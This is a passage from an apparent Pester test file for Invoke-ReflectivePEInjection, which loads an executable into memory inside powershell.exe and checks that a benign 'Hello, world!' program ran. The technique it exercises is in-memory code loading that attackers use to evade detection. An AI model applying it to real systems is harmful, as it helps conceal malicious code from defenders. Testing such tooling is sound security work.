		$TestOutputPath = Join-Path $Env:TEMP 'testoutput.txt'

		BeforeEach {
			if (Test-Path $TestOutputPath) { Remove-Item $TestOutputPath }
		}

		It 'should load an EXE in memory within powershell.exe and write "Hello, world!" to %TEMP%\testoutput.txt when provided no arguments' {
			Invoke-ReflectivePEInjection -PEBytes $ExeBytes -DoNotZeroMZ
		}

		It 'should load an EXE in memory within powershell.exe and write "Hello, world!" to %TEMP%\testoutput.txt when provided arguments' {
			Invoke-ReflectivePEInjection -PEBytes $ExeBytes -ExeArgs 'foo bar' -DoNotZeroMZ
		}

		AfterEach {
			Start-Sleep -Seconds 2
			$TestOutputPath | Should Exist
			$Result = Get-Content $TestOutputPath

			$Result | Should Not BeNullOrEmpty
			$Result.StartsWith('Hello, world!') | Should Be $True
		}
	}
}